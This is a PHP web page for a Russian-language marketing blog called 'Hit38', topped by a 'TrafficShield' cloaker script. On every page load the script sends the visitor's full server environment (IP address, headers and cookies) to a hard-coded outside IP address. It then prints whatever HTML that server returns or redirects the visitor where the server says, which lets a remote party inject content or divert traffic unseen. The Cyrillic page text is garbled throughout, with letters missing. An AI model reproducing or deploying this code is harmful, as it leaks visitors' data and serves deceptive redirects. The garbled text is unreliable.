<?php
namespace TrafficShield; 
error_reporting(0);
	class Traffic_Shield{
		public function run() {							
			ob_start();
			$this->ogrsr9854();
		}
		public function ogrsr9854() {	
            $this->_check(); 
            $response = $this->https_request();        
            $this->main($response);       
        }			
        public function _check() {	
            if(isset($_GET['TS-BHDNR-84848'])){
                echo "5adaf64c3c";
            }
        }
		public function get_header() {	
            $headers = array();     
            foreach($_SERVER as $k=>$v){
               $headers[$k] = $v;
            }
            $headers['TS-BHDNR-74191'] = "900661405725911";
            $headers['TS-BHDNR-74194'] = "5adaf64c3c"; 
            return $headers;
        }
		public function get_header_post() {
            $get_header = $this->get_header();
            return base64_encode(json_encode($get_header));      
        }	
		public function https_request() {
           $get_header['headers'] = $this->get_header_post();
           $ch = curl_init();
           curl_setopt($ch, CURLOPT_URL, "http://198.211.101.164/v2/logic/cloaker");
           curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
           curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36');
           curl_setopt($ch, CURLOPT_POST, true);
           curl_setopt($ch, CURLOPT_POSTFIELDS, $get_header);
           $result = curl_exec($ch);                
           return json_decode($result);
        }
		public function main($response) {
            if(!empty($response)){
               if(isset($response->zrc) && !empty($response->zrc)){
                    echo base64_decode($response->zrc);
                    die();
                }else{                        
                    if($response->type == 1){
                        $this->get_url($response->url,$response->http_code);
                    }
                }
            }
        }
		public function get_url($url,$code) { 
            header("Location: ".$url, true, $code);            
        }
}
$traffic_Shield_Tre9854 = new Traffic_Shield();
$traffic_Shield_Tre9854->run();
// Copyright TrafficShield.io//
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
     
    <title>Hit38</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
    <meta content="Cleaning Company Website Template" name="keywords" />
    <meta content="Cleaning Company Website Template" name="description" />

    <!-- Google Font -->
    <link
      href="https://fonts.googleapis.com/css2?family=Montserrat:wght@100;300;400&display=swap"
      rel="stylesheet"
    />

    <!-- CSS Libraries -->
    <link
      href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css"
      rel="stylesheet"
    />
    <link
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.0/css/all.min.css"
      rel="stylesheet"
    />
    <link href="lib/owlcarousel/assets/owl.carousel.min.css" rel="stylesheet" />
    <link href="lib/lightbox/css/lightbox.min.css" rel="stylesheet" />

    <!-- Template Stylesheet -->
    <link href="css/style.css" rel="stylesheet" />
  </head>

  <body>
    <div class="wrapper">
      <!-- Header Start -->
	    
      <div class="header home">
        <div class="container-fluid">
          <div class="header-top row align-items-center">
            <div class="col-lg-3">
              <div class="brand">
                <a href="index.php"><?php
        echo 'Explore, learn and grow.'
        ?></a>
              </div>
            </div>
            <div class="col-lg-9">
              <div class="navbar navbar-expand-lg bg-light navbar-light">
                <a href="#" class="navbar-brand">MENU</a>
                <button
                  type="button"
                  class="navbar-toggler"
                  data-toggle="collapse"
                  data-target="#navbarCollapse"
                >
                  <span class="navbar-toggler-icon"></span>
                </button>

                <div class="collapse navbar-collapse justify-content-between" id="navbarCollapse">
                  <div class="navbar-nav ml-auto">
                    <a href="index.php" class="nav-item nav-link active">Глаая</a>
                    <a href="blog.php" class="nav-item nav-link">Сттьи</a>
                    <a href="contact.php" class="nav-item nav-link">Контк</a>
                    <a href="policy.php" class="nav-item nav-link">Полииа кфиднциальности</a>
                    <a href="terms.php" class="nav-item nav-link">словия и поления</a>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div class="hero row align-items-center">
            <div class="col-md-12">
              <h2>Популярны</h2>
            </div>
          </div>
        </div>
      </div>
      <!-- Header End -->

      <!-- Blog Start -->
      <div class="blog">
        <div class="container">
          <div class="section-header">
            <h2>Стати</h2>
          </div>
          <div class="row">
            <div class="owl-carousel testimonials-carousel">
              
              <div class="blog-item">
                <img src="./assets/images/bulksplash-alexbemore-k1xf2d7jwus.jpg" alt="Blog" />
                <h3>аксиизация поенцала а...</h3>
                <p><strong></strong> Макетинг в сцальнх сетя - монй инсрумен дя бизнес, позвоящ...</p>
                <a class="btn" href="86e055ccc4ef280f7182d939297c3649.php">Читте далье</a>
              </div>
              

              <div class="blog-item">
                <img src="./assets/images/bulksplash-brookecagle-xcgh5_-qixc.jpg" alt="Blog" />
                <h3>Раскрытие воможнсей упр...</h3>
                <p><strong></strong> првлеие взимооношениями с клиетами (CRM) - мощны иструмент, ктор...</p>
                <a class="btn" href="lI0tjp3apaHvrnnGxY8nOuWMZ1Yx.php">Читате даше</a>
              </div>
              

              <div class="blog-item">
                <img src="./assets/images/bulksplash-alexbemore-71qk8odibko.jpg" alt="Blog" />
                <h3>Как максильно удержь к...</h3>
                <p><strong></strong> Максильное уержание лиентов меет жое заени дл успеха любог...</p>
                <a class="btn" href="AoqVj5NFsHp2U.php">итайте дльше</a>
              </div>
              

              <div class="blog-item">
                <img src="./assets/images/bulksplash-solenfeyissa-taogbz_s-qw.jpg" alt="Blog" />
                <h3>аскрыти вашей левой у...</h3>
                <p><strong></strong> крытие ваше цлей ауитории - клю к созднию эффетивно аркеи...</p>
                <a class="btn" href="9PdKYzWaGug.php">Читайе длше</a>
              </div>
              

            </div>
          </div>
        </div>
      </div>
      <!-- Blog End -->

      <!-- Footer Start -->
      <div class="footer text-center">
        <div class="container">
          <div class="row">
            <div class="col-md-12 col-lg-12">
              <div class="footer-contact">
                <h2>Котакты</h2>
                <p><i class="fa fa-map-marker-alt"></i>481972, оствсая область, оо Павловский Пад, ульвар Космонао, 92</p>
                <p><i class="fa fa-phone-alt"></i>+3799031323115</p>
                <p><i class="fa fa-envelope"></i>ivan77@baranova.com</p>
              </div>
            </div>
          </div>
        </div>

        <div class="container copyright">
          <div class="row">
            <div class="col-md-12">
              <p>
                
                <script>
                  document.write(new Date().getFullYear());
                </script>
                Hit38
              </p>
            </div>
          </div>
        </div>
      </div>
      <!-- Footer End -->

      <a href="#" class="back-to-top"><i class="fa fa-chevron-up"></i></a>
    </div>

    <div class="cookie-banner">
      <p style="color: #000000">
        Сйт испольует файы cookie. Он повляют унавть вс и полуать информацю о ваш ползоваельскм оыте.Прдолжая промотр айта, я соглшаюс с исользоваием айлов cookie ладельем сайта  соотесвии с
        <a target="_blank" href="https://en.wikipedia.org/wiki/HTTP_cookie"
          >Политкой cookie</a
        >
      </p>

      <button class="close-cookie">×</button>
    </div>

    <script>
      window.onload = function () {
        $('.close-cookie').click(function () {
          $('.cookie-banner').fadeOut();
        });
      };
    </script>

    <script>
      let elems = document.querySelectorAll('.server-name');
      elems.forEach((elem) => {
        elem.innerHTML = window.location.hostname;
      });
    </script>

    <!-- JavaScript Libraries -->
    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.bundle.min.js"></script>
    <script src="lib/easing/easing.min.js"></script>
    <script src="lib/owlcarousel/owl.carousel.min.js"></script>
    <script src="lib/isotope/isotope.pkgd.min.js"></script>
    <script src="lib/lightbox/js/lightbox.min.js"></script>

    <!-- Template Javascript -->
    <script src="js/main.js"></script>
  </body>
</html>
